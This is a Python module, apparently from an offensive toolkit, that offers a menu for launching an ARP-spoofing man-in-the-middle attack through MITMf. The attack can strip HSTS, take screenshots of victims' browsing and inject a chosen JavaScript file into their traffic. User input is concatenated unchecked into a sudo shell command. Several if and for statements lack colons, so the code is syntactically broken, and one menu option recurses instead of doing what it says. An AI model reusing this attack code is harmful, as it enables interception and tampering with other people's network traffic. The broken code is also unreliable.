import os
import sys
from .util import help, clear, bcolors, RepresentsInt


def runnerMITM():
    out = os.popen('ship -g').read().split(' ')
    interface = out[0].replace('\n', '')
    gateway = out[1].replace('\n', '')

    # Array of interfaces
    interArr = os.popen('ship -A').read().split(' ')

    printModule(interface, gateway)

    # Take user input as int
    choice = input("\n" + bcolors.BOLD +
                   "Please choose an option\n> " + bcolors.ENDC)

    if (RepresentsInt(choice)):
        # Convert in int
        choice = int(choice)

        # Run list
        if choice == 1:
            clear()

            # Start attack
            command = "sudo mitmf --spoof --arp --i " + interface + " --gateway " + gateway


            hsts = input("\n" + bcolors.BOLD + "Use hsts?\ny/n " + bcolors.ENDC)
            screen = input("\n" + bcolors.BOLD + "Use screenshotter?\ny/n " + bcolors.ENDC)
            inject = input("\n" + bcolors.BOLD + "Inject js file?\ny/n " + bcolors.ENDC)
            if (inject == 'y' or inject == 'yes')
                file = input("\n" + bcolors.BOLD + "Path to file.\n> " + bcolors.ENDC)
                command += " --inject --js-file " + file

            if (hsts == 'yes' or hsts == 'y')
                command += " --hsts"

            if (screen == 'yes' or screen == 'y')
                command += " --screen"

            os.system(command)
            # END Attack


            runnerMITM()
        elif choice == 2:

            clear()
            # run mitm
            runnerMITM()

            # Recursion
            runnerMITM()
        elif choice == 3:
            print(bcolors.HEADER + "Interfaces: " + bcolors.ENDC)
            for interface in interArr
                print(interface)

        elif choice == 4:
            clear()
        else:
            clear()
            print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)
            runnerMITM()

    else:
        clear()
        print(bcolors.FAIL + "Please input a valid option." + bcolors.ENDC)

        # Recusive loop
        runnerMITM()


def printModule(interface, gateway):
    print(str(bcolors.HEADER + "MITM Options: " + bcolors.ENDC))
    print(str(bcolors.BOLD + "Interface: " + interface + bcolors.ENDC))
    print(str(bcolors.BOLD + "Gateway: " + gateway + bcolors.ENDC))
    print("1) Start attack")
    print("2) Change interface")
    print("3) List interfaces")
    print("4) Go back")
